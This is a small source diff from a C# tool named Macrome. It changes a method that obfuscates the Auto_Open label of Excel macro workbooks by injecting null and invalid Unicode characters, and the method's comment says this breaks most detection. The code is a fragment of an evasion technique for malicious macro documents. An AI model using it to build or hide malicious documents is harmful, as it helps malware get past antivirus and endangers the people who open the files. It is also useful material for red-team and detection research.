@@ -321,7 +321,7 @@ namespace Macrome
         ///    nulls and look for Auto_Open without being case sensitive. By injecting this with nulls we break most detection.
         /// </summary>
         /// <returns></returns>
-        public WorkbookStream ObfuscateAutoOpen(string localizedLabel)
+        public WorkbookStream ObfuscateAutoOpen(string localizedLabel = "Auto_Open")
         {
             Random randomUnicodeChar = new Random();
             string[] badUnicodeChars = { "\ufefe", "\uffff", "\ufeff", "\ufffe", "\uffef", "\ufff0", "\ufff1", "\ufff6", "\ufefd", "\u0000", "\udddd" };
@@ -329,7 +329,7 @@ namespace Macrome
             string unicodeLabelWithBadChars = "";
             List<Lbl> labels = GetAllRecordsByType<Lbl>();
             Lbl autoOpenLbl = labels.First(l => l.fBuiltin && l.Name.Value.Equals("\u0001") ||
-                                                l.Name.Value.ToLower().StartsWith(localizedLabel));
+                                                l.Name.Value.ToLower().StartsWith(localizedLabel.ToLower()));
             Lbl replaceLabelStringLbl = ((BiffRecord)autoOpenLbl.Clone()).AsRecordType<Lbl>();
 
             //Characters that work
